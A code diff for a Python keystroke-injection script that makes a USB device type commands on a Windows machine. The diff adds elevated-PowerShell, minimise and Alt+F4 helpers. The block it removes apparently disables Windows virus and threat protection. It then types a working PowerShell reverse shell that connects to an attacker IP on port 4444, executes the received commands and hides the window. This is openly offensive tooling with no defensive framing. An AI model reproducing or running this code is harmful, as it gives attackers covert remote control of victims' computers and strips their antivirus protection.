@@ -136,13 +136,13 @@ def open_powershell():
         time.sleep(0.05)
         send(i)
 
+def admin_enter():
     time.sleep(0.5)
     # press control shift enter
     write_report(chr(48) + NULL_CHAR + chr(40) + NULL_CHAR*5)
 
     time.sleep(0.5)
-    write_report(NULL_CHAR*8)
-
+ 
 
 def windows_key():
     write_report(chr(8)+NULL_CHAR*7)
@@ -164,6 +164,13 @@ def send_reverse_payload():
     print(l)
     for i in l[0]:
         send(i)
+def minimise():
+    write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
+    write_report(NULL_CHAR*8)
+
+def alt_f4():
+    write_report(chr(4) + NULL_CHAR + chr(61) + NULL_CHAR*5)
+    write_report(NULL_CHAR*8)
 
 payload = open('payload.txt', 'r')
 lines = payload.readlines()
@@ -173,7 +180,6 @@ for l in lines:
     l = l.rstrip("\n")
 
     line = l.split(" ")
-    print("here")
     print(l)
     if line[0] == 'string':
         for i in l[6:len(l)]:
@@ -185,7 +191,7 @@ for l in lines:
         send('\t')
     elif line[0] == 'space':
         send(' ')
-    elif line[0] == 'admin_powershell':
+    elif line[0] == 'powershell':
         open_powershell()
     elif line[0] == 'win_key':
         windows_key()
@@ -195,73 +201,13 @@ for l in lines:
         arrow_key(True)
     elif line[0] == 'right_arrow':
         arrow_key(False)
+    elif line[0] == 'minimise':
+        minimise()
+    elif line[0] == 'alt_f4':
+        alt_f4()
+    elif line[0] == 'admin_enter':
+        admin_enter()
 
-"""
-def enter():
-    time.sleep(0.5)
-    write_report(NULL_CHAR*2 + chr(40) + NULL_CHAR*5)
-    write_report(NULL_CHAR*8)
-    time.sleep(0.5)
-for i in "virus and threat protection":
-    print(i)
-    time.sleep(0.05)
-    send(i)
-
-send('\n')
-
-for j in range(0,4):
-    send('\t')
-
-send('\n')
-# hit space 
-send(' ')
-
-time.sleep(1)
-# left arrow
-write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
-
-time.sleep(1)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-
-
-send('\n')
-
-open_powershell()
-
-write_report(NULL_CHAR*8)
-time.sleep(1)
-# left arrow
-write_report(NULL_CHAR*2 + chr(80) + NULL_CHAR*5)
-
-time.sleep(1)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-
-
-send('\n')
-
-time.sleep(0.5)
-# press enter
-send('\n')
-time.sleep(0.5)
-
-
-
-for i in "$client = New-Object System.Net.Sockets.TCPClient(" + "'" + attacker_ip + "'" + ",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()":
-    send(i)
-
-time.sleep(0.5)
-
-# press enter
-send('\n')
-
-write_report(chr(8) + NULL_CHAR + chr(81) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-time.sleep(0.5)
-write_report(chr(4) + NULL_CHAR + chr(61) + NULL_CHAR*5)
-write_report(NULL_CHAR*8)
-"""
 # release all keys
 write_report(NULL_CHAR*8)
 
